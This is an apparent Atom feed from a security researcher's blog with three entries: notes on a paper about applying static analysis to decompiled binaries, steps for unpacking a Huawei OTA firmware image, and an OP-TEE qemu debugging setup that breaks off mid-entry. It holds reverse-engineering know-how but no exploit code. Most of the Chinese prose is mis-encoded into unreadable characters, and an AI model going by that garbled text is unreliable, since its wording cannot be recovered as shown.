<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>o0xmuhe&#39;s blog</title>
  
  <subtitle>0x414243444546 ????</subtitle>
  <link href="https://o0xmuhe.github.io/atom.xml" rel="self"/>
  
  <link href="https://o0xmuhe.github.io/"/>
  <updated>2022-09-12T06:44:35.197Z</updated>
  <id>https://o0xmuhe.github.io/</id>
  
  <author>
    <name>muhe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Paper read &lt;&lt;The Convergence of Source Code and Binary Vulnerability Discovery â€“ A Case Study&gt;&gt;</title>
    <link href="https://o0xmuhe.github.io/2022/09/12/Paper-read-The-Convergence-of-Source-Code-and-Binary-Vulnerability-Discovery-%E2%80%93-A-Case-Study/"/>
    <id>https://o0xmuhe.github.io/2022/09/12/Paper-read-The-Convergence-of-Source-Code-and-Binary-Vulnerability-Discovery-%E2%80%93-A-Case-Study/</id>
    <published>2022-09-12T05:33:26.000Z</published>
    <updated>2022-09-12T06:44:35.197Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a><code>Background</code></h2><p>  æœ€è¿‘é˜…è¯»äº†ä¸€ç¯‡è®ºæ–‡<code>&lt;&lt;The Convergence of Source Code and Binary Vulnerability Discovery â€“ A Case Study&gt;&gt;</code>ï¼Œå¾ˆå·§åˆçš„æ˜¯è®ºæ–‡çš„ç ”ç©¶ä¸­ï¼Œå…³äºå°†SASTå·¥å…·åº”ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶(é€šè¿‡decompiler)ï¼Œå³è·å–ä¼ªä»£ç ä¹‹åï¼Œåœ¨ä¼ªä»£ç ä¸Šè·‘SASTå·¥å…·æ¥æ‰¾æ¼æ´è¿™ä¸ªæ¨¡å¼æˆ‘å’Œ<code>@C0ss4ck</code>ä¸€èµ·åšè¿‡ï¼Œåœ¨æˆ‘ä»¬æ”¶åˆ°ä¸€äº›æˆæ•ˆä¹‹åå‘ç°ä¹Ÿæœ‰äººåšäº†<a href="https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/">ç±»ä¼¼çš„å·¥ä½œ</a>ï¼Œä¸è¿‡ä»–å¥½åƒæ²¡æœ‰ç‰¹åˆ«æ·±å…¥ :D </p><span id="more"></span><p>   æˆ‘ä»¬è¿™åšä¸»è¦æ˜¯å› ä¸ºä¸€äº›ä¸å¯è¯´çš„åŸå› ï¼Œæœ€å¼€å§‹æ˜¯<code>@C0ss4ck</code>æçš„ç”¨IDAPythonæçš„å·¥å…·ï¼Œä½†æ˜¯ç”±äºåšé€‚é…æ¯”è¾ƒéº»çƒ¦ä¸å¤Ÿçµæ´»ï¼›åæ¥æˆ‘æå‡ºäº†<code>decompiler+weggli</code>çš„åšæ³•çš„æ—¶å€™ï¼Œæˆ‘ä»¬éƒ½ä¸æ˜¯é‚£ä¹ˆçš„çœ‹å¥½ï¼Œä½†æ˜¯æäº†ä¸€äº›demoå‘ç°ç¡®å®å¯è¡Œï¼Œå¯¹äºä¸€äº›ç®€å•çš„æ¼æ´æ¨¡å‹æ˜¯å¯ä»¥å¬å›çš„ï¼Œä¸»è¦çš„ç“¶é¢ˆå°±åœ¨decompile codeçš„è´¨é‡å’Œè§„åˆ™çš„ç¼–å†™äº†ï¼ŒåŒæ—¶ç”±äºweggliæœ¬èº«ä¸æ”¯æŒæ•°æ®æµï¼Œå¹¶ä¸”ä¸»è¦æ˜¯è¿‡ç¨‹å†…çš„æ¼æ´æ¨¡å¼åŒ¹é…(AST regexp)ï¼Œæ‰€ä»¥åé¢å°±åˆé¢ä¸´ç“¶é¢ˆçš„é—®é¢˜äº†ï¼›åœ¨æˆ‘åšè°ƒç ”çš„æ—¶å€™ï¼Œå‘ç°äº†è¿™ç¯‡æ–°é²œçš„è®ºæ–‡ï¼Œåœ¨è¯»å®Œä¹‹åæ„Ÿè§¦è‰¯å¤šï¼Œå¯¹<code>decompiler+SAST</code>çš„åšæ³•ä¹Ÿæœ‰äº†æ›´å¤šçš„ç†è§£ã€‚</p><h2 id="Read-this-PAPER"><a href="#Read-this-PAPER" class="headerlink" title="Read this PAPER"></a>Read this <code>PAPER</code></h2><p>  è¿™ç¯‡è®ºæ–‡è®¨è®ºäº†æºç /ä¼ªä»£ç +SASTå·¥å…·åœ¨æ¼æ´æŒ–æ˜ä¸Šçš„æ•ˆæœï¼Œä»¥åŠå¯¹äº<code>ä¼ªä»£ç +SAST</code>è¿™ç§æ¨¡å¼çš„å±€é™æ€§çš„æ¢ç©¶ï¼Œå¯¹å…¶ä¸­çš„è¯¯æŠ¥&amp;æ¼æŠ¥æ ¹æœ¬åŸå› çš„åˆ†æã€‚ </p><h3 id="å…³äºè®ºæ–‡ä¸­çš„å®éªŒè®¾è®¡"><a href="#å…³äºè®ºæ–‡ä¸­çš„å®éªŒè®¾è®¡" class="headerlink" title="å…³äºè®ºæ–‡ä¸­çš„å®éªŒè®¾è®¡"></a>å…³äºè®ºæ–‡ä¸­çš„å®éªŒè®¾è®¡</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912140406820.png" alt="image-20220912140406820"></p><ol><li>æºç ç›´æ¥ä½¿ç”¨ SAST å·¥å…·</li><li>å¤šç§decompileråç¼–è¯‘ä¹‹åè·å–ä¼ªä»£ç ï¼Œä¸¢ç»™SASTå·¥å…·</li><li>ä¼ªä»£ç ä¿®æ­£ä¹‹å(è¾¾åˆ°å¯ç¼–è¯‘çš„ç¨‹åº¦ï¼Œæœ‰äº›å¤æ‚ç›®æ ‡è¦è£å‰ª)ï¼Œç»™SASTå·¥å…·ç”¨</li></ol><h3 id="å·¥å…·-amp-ç›®æ ‡é€‰æ‹©"><a href="#å·¥å…·-amp-ç›®æ ‡é€‰æ‹©" class="headerlink" title="å·¥å…· &amp; ç›®æ ‡é€‰æ‹©"></a>å·¥å…· &amp; ç›®æ ‡é€‰æ‹©</h3><blockquote><p>   å°è¯•å¬å› real world vulns</p></blockquote><p>åŸºæœ¬ä¸Šéƒ½æ˜¯ä¼˜ç§€çš„å·¥å…·ï¼Œå…¶ä¸­ä¸¤æ¬¾å•†ä¸šå·¥å…·å¹¶æ²¡æœ‰å†™å…·ä½“æ˜¯å•¥ï¼Œä½†æ˜¯è¿™ä¸ª <code>Comm_1</code>çœ‹èµ·æ¥å¥½åƒCoverity :) ä¸ç®¡æ€ä¹ˆæ ·ï¼Œå…¶ä¸­çš„ <code>codeql</code>å’Œ<code>joern</code>æˆ‘å¾ˆæ„Ÿå…´è¶£ï¼Œæ¯•ç«Ÿå¯ä»¥è‡ªå®šä¹‰è§„åˆ™ï¼Œè¿™å¯¹æˆ‘æ¥è¯´æ— ç–‘æ˜¯æ›´å¥½çš„ï¼Œå¯ä»¥å¬å›æ›´å¤šé—®é¢˜ &amp; é€‚ç”¨äºæ›´å¤šçš„åœºæ™¯ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912141551810.png" alt="image-20220912141551810"></p><p>å¯¹äºæ¼æ´çš„é€‰æ‹©ï¼Œè¯¥è®ºæ–‡ä¹Ÿé€‰çš„æ¯”è¾ƒå¹¿æ³›ï¼Œå„ç§ç±»å‹éƒ½æœ‰ï¼Œå¤æ‚åº¦ä¹Ÿå¤Ÿï¼Œå¯ä»¥æ›´å¥½çš„â€œæµ‹é‡â€è¿™äº›å·¥å…· :)</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142030762.png" alt="image-20220912142030762"></p><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><ol><li><p>  åç¼–è¯‘ä»£ç å¹¶ä¸æ˜¯å¼€ç®±å³ç”¨çš„</p></li><li><p>  å¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ<code>ä¼ªä»£ç +SAST</code>çš„æ¨¡å¼å¯è¡Œï¼Œä½†æ˜¯æœ‰é™</p></li><li><p><code>SAST</code>å·¥å…·è®¾è®¡ä¸Šæ˜¯ç»™æºç ç”¨çš„ï¼Œè¿™æ˜¯<code>by design</code>çš„ï¼›äºŒè¿›åˆ¶æ–‡ä»¶ä¸¢å¤±äº†å…³é”®ä¿¡æ¯(å°¤å…¶æ˜¯ç¼–è¯‘å™¨ä¼˜åŒ–çš„å½±å“)ï¼Œä¸é€‚åˆç»™<code>SAST</code>å·¥å…·åšåˆ†æï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè®ºæ–‡ä¸­è¯´ä¸ç”¨LLVM Lifterçš„åŸå› </p><blockquote><p>  decompilers are still designed to generate code that is easy to understand for humans, and SAST tools are still designed to parse â€œwell-writtenâ€ code that is not generated by a machine.</p></blockquote></li><li><p>  <strong>ç¼–è¯‘å™¨ä¼˜åŒ–å¾ˆæœ‰æ„æ€ï¼Œæœ‰äº›æ¼æ´å› ä¸ºä¼˜åŒ–inlineï¼Œæ‰€ä»¥ä»è¿‡ç¨‹é—´â€“&gt;è¿‡ç¨‹å†…ï¼Œdecompileä¹‹åçš„ä»£ç åè€Œæ‰¾åˆ°äº†æ¼æ´ :)</strong></p></li></ol><blockquote><p>ä¼˜åŒ–çš„è¯ï¼Œ ä¸¤ä¸ªæ€è·¯ï¼Œç›¸å½“äºæœç€åŒä¸€ä¸ªæ–¹å‘å‰è¿›çš„è·¯:</p></blockquote><ol><li>æé«˜åç¼–è¯‘ä»£ç çš„è´¨é‡</li><li>ä¼˜åŒ–<code>SAST</code>å·¥å…·ï¼Œè®©å…¶é€‚é…åç¼–è¯‘çš„ä»£ç </li></ol><h3 id="æ¼æŠ¥-amp-è¯¯æŠ¥-Root-cause"><a href="#æ¼æŠ¥-amp-è¯¯æŠ¥-Root-cause" class="headerlink" title="æ¼æŠ¥ &amp; è¯¯æŠ¥ Root cause"></a>æ¼æŠ¥ &amp; è¯¯æŠ¥ Root cause</h3><blockquote><p>  ä¸ªäººè®¤ä¸ºæ¯”è¾ƒæ ¸å¿ƒçš„åœ°æ–¹äº†</p></blockquote><h4 id="P1-Inability-to-Recover-the-Size-of-Stack-Buffers"><a href="#P1-Inability-to-Recover-the-Size-of-Stack-Buffers" class="headerlink" title="P1 - Inability to Recover the Size of Stack Buffers"></a>P1 - Inability to Recover the Size of Stack Buffers</h4><p>ç»è¿‡ç¼–è¯‘ä¼˜åŒ–ï¼Œä¸‹é¢çš„ä»£ç ä¸­s1ç”±äºæ˜¯æŒ‡å‘äº†ä¸ºåˆå§‹åŒ–å†…å­˜ï¼Œæ‰€ä»¥å¯èƒ½ä¼šæŠ¥å‘Šæˆæ ˆæº¢å‡º</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142153011.png" alt="image-20220912142153011"><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142204926.png" alt="image-20220912142204926"></p><p>è¯´æ˜¯è¿™æ ·è¯´ï¼Œä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºï¼Œè¿™ç§æƒ…å†µæ˜¯å¯ä»¥é¿å…çš„ï¼Œé€šè¿‡æ±‡ç¼–æ˜¯å¯ä»¥åˆ¤æ–­å‡ºæ¥è¿™ä¸ª stack buffer æœ‰å¤šå¤§ï¼Œè¿™ç§è¯¯æŠ¥ç†è®ºä¸Šæ˜¯å¯ä»¥æ’å‡ºçš„ï¼Œå‰ææ˜¯æ”¶é›†æ›´å¤šçš„ä¿¡æ¯ &lt;â€“ ä¼˜åŒ–é¡¹</p><h4 id="P2-Signed-and-Unsigned-Integers"><a href="#P2-Signed-and-Unsigned-Integers" class="headerlink" title="P2 - Signed and Unsigned Integers"></a>P2 - Signed and Unsigned Integers</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142520350.png" alt="image-20220912142520350"></p><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå˜é‡ç±»å‹åˆ†æé”™è¯¯ï¼Œåœ¨å¯¹ä¼ªä»£ç ä¸­äº§ç”Ÿè¯¯æŠ¥æ­£å¸¸ï¼Œè¿™ä¸ªå¦‚æœä¸äººä¸ºå¹²é¢„ï¼Œç¡®å®æ²¡åŠæ³•</p><h4 id="P3-Integer-Operations-on-Uninitialized-Variables"><a href="#P3-Integer-Operations-on-Uninitialized-Variables" class="headerlink" title="P3 - Integer Operations on Uninitialized Variables"></a>P3 - Integer Operations on Uninitialized Variables</h4><p>ç”±äºç¼ºå°‘å¿…è¦çš„ä¿¡æ¯ï¼Œå¯¼è‡´åœ¨ <code>sub 129CF</code>ä¸¢å¤±äº†a2å’Œa4çš„ä¿¡æ¯ï¼Œå¯¼è‡´SASTå·¥å…·äº§ç”Ÿè¯¯æŠ¥</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142633914.png" alt="image-20220912142633914"></p><h4 id="P4-Function-Pointers"><a href="#P4-Function-Pointers" class="headerlink" title="P4 - Function Pointers"></a>P4 - Function Pointers</h4><p>å‡½æ•°æŒ‡é’ˆé—®é¢˜ï¼Œè¿™ä¸ªå¾ˆå·§åˆï¼Œå‰ä¸¤å¤©è¯·æ•™<code>@jmpews</code>çš„æ—¶å€™ï¼Œæåˆ°äº†decompiler+SASTçš„åšæ³•ï¼Œå½“æ—¶æˆ‘é—®çš„æ˜¯ <code>joern</code>ï¼Œå¤§ä½¬çš„è¯´æ³•æ˜¯Cæ›´ä¸å¥½æ•´ï¼Œ <code>c++ è¿˜å¯ä»¥èµ° demangle</code></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142958000.png" alt="image-20220912142958000"></p><p>ä¸Šé¢çš„ä»£ç åç¼–è¯‘ä¹‹åå¾—åˆ°:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143018996.png" alt="image-20220912143018996"></p><p>åŸºæœ¬ä¸Šæ˜¯æ— æ³•åˆ†æçš„ï¼Œå°±ç®—æ˜¯äººè‚‰é€†å‘ï¼Œä¹Ÿè¦é‡å»ºè¿™ä¸ªç»“æ„ä½“ï¼Œç„¶åè½¬æ¢å˜é‡ç±»å‹ï¼Œè‡ªåŠ¨åŒ–ä¸å¤ªç°å®ï¼Œè¿™å—çš„è¯¯æŠ¥ç¡®å®æ²¡åŠæ³•</p><h4 id="P5-Pointers-as-Integers"><a href="#P5-Pointers-as-Integers" class="headerlink" title="P5 - Pointers as Integers"></a>P5 - Pointers as Integers</h4><p>è¿˜æ˜¯å˜é‡ç±»å‹çš„é—®é¢˜ï¼Œåç¼–è¯‘ä»£ç å¯¹ç‰¹å®šå˜é‡ç±»å‹åˆ†æé”™è¯¯ï¼Œå¯¼è‡´çš„è¯¯æŠ¥</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143157818.png" alt="image-20220912143157818"></p><p>åç¼–è¯‘ä¹‹å:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143214154.png" alt="image-20220912143214154"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143233125.png" alt="image-20220912143233125"></p><h4 id="P6-Integers-of-Wrong-Size"><a href="#P6-Integers-of-Wrong-Size" class="headerlink" title="P6 - Integers of Wrong Size"></a>P6 - Integers of Wrong Size</h4><p>å¯¹v22 å’Œ v26 ç±»å‹è¯†åˆ«é”™è¯¯ï¼Œæ··ç”¨äº† <code>uint8_t</code> å’Œ <code>int64</code>ï¼Œæ‰€ä»¥å¯èƒ½ä¼šè¯¯æŠ¥æ•´æ•°æº¢å‡º :(</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143334876.png" alt="image-20220912143334876"></p><h4 id="P7-Simplified-Expressions"><a href="#P7-Simplified-Expressions" class="headerlink" title="P7 - Simplified Expressions"></a>P7 - Simplified Expressions</h4><p>è¿™æ˜¯ä¸€ç±»ç‰¹æ®Šæƒ…å†µ</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143520029.png" alt="image-20220912143520029"></p><p>è¿™é‡Œæ˜¾ç„¶æŠŠ<code>||</code>å’Œ<code>&amp;&amp;</code>ææ··äº†ï¼Œä½†æ˜¯åç¼–è¯‘ä¹‹å</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143546104.png" alt="image-20220912143546104"></p><p>è¿™ç±»è¡¨è¾¾å¼åœ¨ç¼–è¯‘å™¨ä¼˜åŒ–å¤„ç†ä¹‹åï¼Œå†åç¼–è¯‘ï¼Œè¯¥è¡¨è¾¾å¼å·²ç»çœ‹ä¸å‡ºæ¥äº†ï¼Œå°±ä¼šæ¼æŠ¥è¿™ä¸ªé—®é¢˜ :(</p><h2 id="Futher-work"><a href="#Futher-work" class="headerlink" title="Futher work"></a>Futher work</h2><p><code>decompiler+SAST</code>å¯è¡Œï¼Œä½†æ˜¯éœ€è¦ä¼˜åŒ–ï¼Œèƒ½è¦†ç›–çš„åœºæ™¯ä¹Ÿæœ‰é™ï¼Œç›®å‰æ¥çœ‹IoTåœºæ™¯æ˜¯æ¯”è¾ƒé€‚åˆçš„ï¼Œæ¯”å¦‚å„ç§å¥‡è‘©çš„å‘½ä»¤æ³¨å…¥ï¼Œæ˜¾ç„¶æ˜¯å¯ä»¥å¬å›çš„ã€‚</p><ol><li>  æœ€å¥½ä¸è¦é€‰ä¾èµ–ç¼–è¯‘çš„SASTå·¥å…·ï¼Œå¦‚codeql</li><li>  é€‰æ‹©å¯ä»¥è‡ªå®šä¹‰è§„åˆ™çš„å·¥å…·</li><li>  æœ€å¥½å¯ä»¥æ”¯æŒè¿‡ç¨‹é—´åˆ†æã€æ•°æ®æµ</li><li>  ä¸ºäº†å¼¥è¡¥åç¼–è¯‘ä»£ç çš„ä¸è¶³ï¼Œå¯ä»¥ç»“åˆæ±‡ç¼–å±‚é¢æ”¶é›†ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚æ ˆä¸Šå˜é‡çš„å¤§å°</li></ol><blockquote><p>  ä¸ªäººæ¥ä¸€ä¸ªå¤§èƒ†çš„æ„æƒ³ï¼Œä»ctreeä¸Šæ”¶é›†ä¿¡æ¯ï¼Œç”Ÿæˆcodeqlé‚£æ ·çš„rel dbï¼Œç›®å‰æ¥çœ‹æ¯”è¾ƒæ¥è¿‘çš„æ˜¯joernï¼Œä½†æ˜¯å®ƒæ˜¯åŸºäºghirdaï¼Œä¼˜åŒ–ç©ºé—´è¿˜æ˜¯æœ‰çš„ã€‚</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://dl.acm.org/doi/10.1145/3488932.3497764">https://dl.acm.org/doi/10.1145/3488932.3497764</a></p><p><a href="https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/">https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/</a></p><p><a href="https://docs.joern.io/home">https://docs.joern.io/home</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;&lt;code&gt;Background&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;  æœ€è¿‘é˜…è¯»äº†ä¸€ç¯‡è®ºæ–‡&lt;code&gt;&amp;lt;&amp;lt;The Convergence of Source Code and Binary Vulnerability Discovery â€“ A Case Study&amp;gt;&amp;gt;&lt;/code&gt;ï¼Œå¾ˆå·§åˆçš„æ˜¯è®ºæ–‡çš„ç ”ç©¶ä¸­ï¼Œå…³äºå°†SASTå·¥å…·åº”ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶(é€šè¿‡decompiler)ï¼Œå³è·å–ä¼ªä»£ç ä¹‹åï¼Œåœ¨ä¼ªä»£ç ä¸Šè·‘SASTå·¥å…·æ¥æ‰¾æ¼æ´è¿™ä¸ªæ¨¡å¼æˆ‘å’Œ&lt;code&gt;@C0ss4ck&lt;/code&gt;ä¸€èµ·åšè¿‡ï¼Œåœ¨æˆ‘ä»¬æ”¶åˆ°ä¸€äº›æˆæ•ˆä¹‹åå‘ç°ä¹Ÿæœ‰äººåšäº†&lt;a href=&quot;https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/&quot;&gt;ç±»ä¼¼çš„å·¥ä½œ&lt;/a&gt;ï¼Œä¸è¿‡ä»–å¥½åƒæ²¡æœ‰ç‰¹åˆ«æ·±å…¥ :D &lt;/p&gt;</summary>
    
    
    
    
    <category term="Paper" scheme="https://o0xmuhe.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>HW OTA unpack</title>
    <link href="https://o0xmuhe.github.io/2022/09/02/HW-OTA-unpack/"/>
    <id>https://o0xmuhe.github.io/2022/09/02/HW-OTA-unpack/</id>
    <published>2022-09-02T05:43:15.000Z</published>
    <updated>2022-09-02T05:46:49.964Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><h3 id="unzipè§£å¼€OTAåŒ…"><a href="#unzipè§£å¼€OTAåŒ…" class="headerlink" title="unzipè§£å¼€OTAåŒ…"></a>unzipè§£å¼€OTAåŒ…</h3><span id="more"></span><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111641389.png" alt="image-20220825111641389"></p><p>æˆ‘ä»¬çš„ç›®æ ‡åœ¨ update_sd_base.zipé‡Œï¼Œå…¶ä»–éƒ¨åˆ†å’¨è¯¢äº†æ˜¯ä¸€äº›å‡ºå‚å¸¦çš„APPï¼Œæ¯”å¦‚é‡Œé¢å°±çœ‹åˆ°äº†ä»Šæ—¥å¤´æ¡ æŠ–éŸ³å•¥çš„ã€‚</p><p>ç›´æ¥è§£å¼€ update_sd_base.zip åˆ°ä¸‹ä¸€æ­¥</p><h3 id="ä»UPDATE-APPæå–SYSTEM"><a href="#ä»UPDATE-APPæå–SYSTEM" class="headerlink" title="ä»UPDATE.APPæå–SYSTEM"></a>ä»UPDATE.APPæå–SYSTEM</h3><p>ç›´æ¥ç”¨  <a href="https://github.com/jenkins-84/split_updata.pl/blob/master/splitupdate">https://github.com/jenkins-84/split_updata.pl/blob/master/splitupdate</a> æ¥åˆ†å‰²å°±è¡Œ</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111723396.png" alt="image-20220825111723396"></p><h3 id="unpack-erofs"><a href="#unpack-erofs" class="headerlink" title="unpack erofs"></a>unpack erofs</h3><h4 id="æ–¹æ³•1-simg2imgç„¶åæŒ‚åœ¨erofs-kernel-5-4"><a href="#æ–¹æ³•1-simg2imgç„¶åæŒ‚åœ¨erofs-kernel-5-4" class="headerlink" title="æ–¹æ³•1: simg2imgç„¶åæŒ‚åœ¨erofs(kernel 5.4)"></a>æ–¹æ³•1: simg2imgç„¶åæŒ‚åœ¨erofs(kernel 5.4)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/android-simg2img/simg2img SYSTEM.img system1.img</span><br><span class="line">sudo mount -t erofs system1.img 1 -oloop</span><br></pre></td></tr></table></figure><p>å°è¯•è¯»æ–‡ä»¶çš„æ—¶å€™å‘ç°æŠ¥é”™</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111833524.png" alt="image-20220825111833524"></p><p>dmesgå‘ç° : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825111906816.png" alt="image-20220825111906816"></p><h4 id="æ–¹æ³•2-ç›´æ¥ä½¿ç”¨-extractoré‡Œçš„-erofs-tools-py-æ¥ç›´æ¥æŠŠsystemé•œåƒè§£å¼€"><a href="#æ–¹æ³•2-ç›´æ¥ä½¿ç”¨-extractoré‡Œçš„-erofs-tools-py-æ¥ç›´æ¥æŠŠsystemé•œåƒè§£å¼€" class="headerlink" title="æ–¹æ³•2: ç›´æ¥ä½¿ç”¨ extractoré‡Œçš„ erofs_tools.py æ¥ç›´æ¥æŠŠsystemé•œåƒè§£å¼€"></a>æ–¹æ³•2: ç›´æ¥ä½¿ç”¨ extractoré‡Œçš„ erofs_tools.py æ¥ç›´æ¥æŠŠsystemé•œåƒè§£å¼€</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/extracotr/erofs_tool.py extract --verify-zip system1.img harmony_system</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://zhuanlan.zhihu.com/p/60617375">https://zhuanlan.zhihu.com/p/60617375</a></p><p><a href="https://github.com/jenkins-84/split_updata.pl">https://github.com/jenkins-84/split_updata.pl</a></p><p><a href="https://github.com/srlabs/extractor">https://github.com/srlabs/extractor</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æ­¥éª¤&quot;&gt;&lt;a href=&quot;#æ­¥éª¤&quot; class=&quot;headerlink&quot; title=&quot;æ­¥éª¤&quot;&gt;&lt;/a&gt;æ­¥éª¤&lt;/h2&gt;&lt;h3 id=&quot;unzipè§£å¼€OTAåŒ…&quot;&gt;&lt;a href=&quot;#unzipè§£å¼€OTAåŒ…&quot; class=&quot;headerlink&quot; title=&quot;unzipè§£å¼€OTAåŒ…&quot;&gt;&lt;/a&gt;unzipè§£å¼€OTAåŒ…&lt;/h3&gt;</summary>
    
    
    
    
    <category term="EROFS" scheme="https://o0xmuhe.github.io/tags/EROFS/"/>
    
  </entry>
  
  <entry>
    <title>opteeå­¦ä¹ ç¯‡(1) ç¯å¢ƒ&amp;è°ƒè¯•</title>
    <link href="https://o0xmuhe.github.io/2022/08/24/optee%E5%AD%A6%E4%B9%A0/"/>
    <id>https://o0xmuhe.github.io/2022/08/24/optee%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-24T15:15:33.000Z</published>
    <updated>2022-10-26T15:32:08.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>æœ¬ç¯‡ä¸»è¦æ˜¯ç¯å¢ƒé…ç½®ã€è°ƒè¯•ã€æµç¨‹æ¢³ç†</p><span id="more"></span><h3 id="qemu-v8ç¯å¢ƒæ­å»º"><a href="#qemu-v8ç¯å¢ƒæ­å»º" class="headerlink" title="qemu_v8ç¯å¢ƒæ­å»º"></a>qemu_v8ç¯å¢ƒæ­å»º</h3><blockquote><p><a href="https://optee.readthedocs.io/en/latest/building/prerequisites.html">https://optee.readthedocs.io/en/latest/building/prerequisites.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ repo init -u https://github.com/OP-TEE/manifest.git -m qemu_v8.xml</span><br><span class="line">$ repo sync -c -j8</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make toolchains</span><br><span class="line">$ make run</span><br></pre></td></tr></table></figure><p>åŒæ­¥ä¸‹æ¥çš„ä»“åº“å¦‚ä¸‹</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220822175933034.png" alt="image-20220822175933034"></p><p>è¿è¡Œä¸€ä¸‹è¯•è¯•çœ‹:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824161556316.png" alt="image-20220824161556316"></p><p>éœ€è¦æŒ‡å®šç‰ˆæœ¬è·‘çš„è¯ : <code>make -f qemu_v8.mk run-only</code></p><blockquote><p><a href="https://optee.readthedocs.io/en/latest/debug/index.html">https://optee.readthedocs.io/en/latest/debug/index.html</a></p></blockquote><p>è¿™é‡Œä»¥qemu-v8ä¸ºä¾‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">make  DEBUG=1  -f qemu_v8.mk all</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make DEBUG=1 -f qemu_v8.mk run-only</span><br></pre></td></tr></table></figure><p>å› ä¸ºMakefileä¸­å¯åŠ¨çš„æ—¶å€™å·²ç»å†™äº†è®¾ç½®äº† <code>-s -S</code>äº† ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿æ¥</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824163338069.png" alt="image-20220824163338069"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824163032421.png" alt="image-20220824163032421"></p><p>å¯ä»¥ä»<a href="https://developer.arm.com/downloads/-/gnu-a">è¿™é‡Œ</a>ä¸‹è½½å¯¹åº”çš„gdbæ¥ç”¨</p><p>è£…äº†<code>libncurses5-dev</code>è¿˜æ˜¯æ‰¾ä¸åˆ°soçš„è¯ï¼Œå¯ä»¥å‚è€ƒ <a href="https://www.cnblogs.com/wanglouxiaozi/p/14987053.html">https://www.cnblogs.com/wanglouxiaozi/p/14987053.html</a></p><p><code>gdb-multiarch</code> 